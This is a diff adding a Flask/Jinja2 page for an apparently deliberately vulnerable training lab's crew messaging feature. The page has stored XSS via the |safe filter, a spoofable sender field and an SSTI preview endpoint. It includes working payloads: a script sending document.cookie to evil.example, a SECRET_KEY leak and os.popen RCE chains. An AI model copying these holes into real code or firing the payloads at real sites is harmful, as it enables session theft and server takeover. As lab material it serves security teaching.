@@ -1,0 +1,74 @@
+{% extends 'base.html' %}
+{% block title %}Crew Messaging{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v20.css') }}">
+{% endblock %}
+{% block content %}
+<div class="pagehead" style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
+  <img src="{{ url_for('static', filename='img/svg/icon-messaging.svg') }}" width="44" height="44" alt="">
+  <div>
+    <h1 style="margin:0 0 2px;">Crew Messaging</h1>
+    <p style="margin:0;color:var(--dim);font-size:13px;">Station-wide internal communications. All messages rendered with <code>|safe</code>.</p>
+  </div>
+  <a href="{{ url_for('messaging_preview') }}?template={{ '{{config.__class__.__init__.__globals__[%22os%22].popen(%22id%22).read()}}' }}" class="btn small" style="margin-left:auto;">SSTI Lab →</a>
+</div>
+
+<div class="grid grid-2" style="gap:18px;align-items:start;">
+  <div class="panel" style="padding:0;overflow:hidden;">
+    <div style="padding:14px 16px;border-bottom:1px solid var(--hairline);display:flex;align-items:center;justify-content:space-between;">
+      <h2 style="margin:0;font-size:14px;">All Hands Channel</h2>
+      <span style="font-size:10px;color:var(--dim);font-family:'JetBrains Mono',monospace;">{{ messages|length }} messages</span>
+    </div>
+    <div class="msg-thread">
+      {% for msg in messages %}
+      <div>
+        <div class="msg-meta">{{ msg.from }} · {{ msg.ts }} UTC</div>
+        <div class="msg-bubble {{ 'outbound' if msg.from == current_user_name else 'inbound' }}">
+          {{ msg.body | safe }}
+        </div>
+      </div>
+      {% endfor %}
+    </div>
+    <form method="post" action="{{ url_for('messaging_send') }}" style="border-top:1px solid var(--hairline);">
+      <div class="msg-compose">
+        <input type="text" name="body" placeholder="Send a message… (try &lt;img src=x onerror=alert(document.cookie)&gt;)" autocomplete="off">
+        <button type="submit" class="btn small">Send</button>
+      </div>
+      <div style="padding:0 14px 10px;display:flex;align-items:center;gap:8px;">
+        <span style="font-size:11px;color:var(--dim);">Send as:</span>
+        <input type="text" name="from" value="{{ current_user_name }}" style="padding:4px 8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--amber);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:11px;width:120px;">
+        <span class="sev p2" style="font-size:9px;">Spoofable</span>
+      </div>
+    </form>
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:14px;">
+    <div class="panel">
+      <h2>Stored XSS <span class="sev p2" style="margin-left:6px;">P2</span></h2>
+      <p style="font-size:13px;color:var(--dim);">Messages are stored verbatim and rendered with Jinja's <code>|safe</code> filter — any HTML/script tag executes for every crew member who loads the thread.</p>
+      <div class="vuln-callout">
+        <span class="sev p2" style="flex:none;align-self:flex-start;">P2</span>
+        <p>Try: <code>&lt;script&gt;fetch('https://evil.example?c='+document.cookie)&lt;/script&gt;</code></p>
+      </div>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-79 · Stored Cross-Site Scripting</div>
+    </div>
+
+    <div class="panel">
+      <h2>Message Spoofing <span class="sev p2" style="margin-left:6px;">P2</span></h2>
+      <p style="font-size:13px;color:var(--dim);">The <code>from</code> field is read from the POST body — any user can impersonate any other crew member by changing the hidden field.</p>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-345 · Insufficient Verification of Data Authenticity</div>
+    </div>
+
+    <div class="panel">
+      <h2>SSTI Preview <span class="sev p1" style="margin-left:6px;">P1</span></h2>
+      <p style="font-size:13px;color:var(--dim);">The <code>/messaging/preview?template=</code> endpoint renders arbitrary Jinja2 templates. Classic SSTI escalates to RCE.</p>
+      <div style="display:flex;flex-direction:column;gap:6px;margin-top:10px;">
+        <a href="{{ url_for('messaging_preview') }}?template={{ '{{7*7}}' }}" class="btn small">7×7 (basic)</a>
+        <a href="{{ url_for('messaging_preview') }}?template={{ '{{config.SECRET_KEY}}' }}" class="btn small secondary">Leak SECRET_KEY</a>
+        <a href="{{ url_for('messaging_preview') }}?template={{ '{{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}' }}" class="btn small secondary">RCE: id</a>
+      </div>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-1336 · Server-Side Template Injection</div>
+    </div>
+  </div>
+</div>
+{% endblock %}
